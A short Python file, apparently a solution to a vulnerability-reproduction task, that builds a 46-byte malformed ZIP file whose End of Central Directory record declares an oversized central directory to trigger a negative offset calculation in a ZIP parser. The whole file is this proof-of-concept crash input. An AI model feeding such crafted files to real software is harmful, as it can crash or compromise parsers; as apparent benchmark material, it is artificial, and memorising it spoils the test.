import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        data = bytearray()
        # End of Central Directory (EOCD) record with crafted fields to cause negative start offset calculations
        data += b'PK\x05\x06'          # EOCD signature
        data += b'\x00\x00'            # number of this disk
        data += b'\x00\x00'            # disk with start of central directory
        data += b'\x01\x00'            # total number of entries in the central dir on this disk
        data += b'\x01\x00'            # total number of entries in the central dir
        data += b'\xff\xff\xff\xff'    # size of the central directory (large to trigger negative calc)
        data += b'\x00\x00\x00\x00'    # offset of start of central directory
        comment_len = 24
        data += struct.pack('<H', comment_len)  # ZIP file comment length
        data += b'A' * comment_len              # ZIP file comment to make total length 46 bytes
        return bytes(data)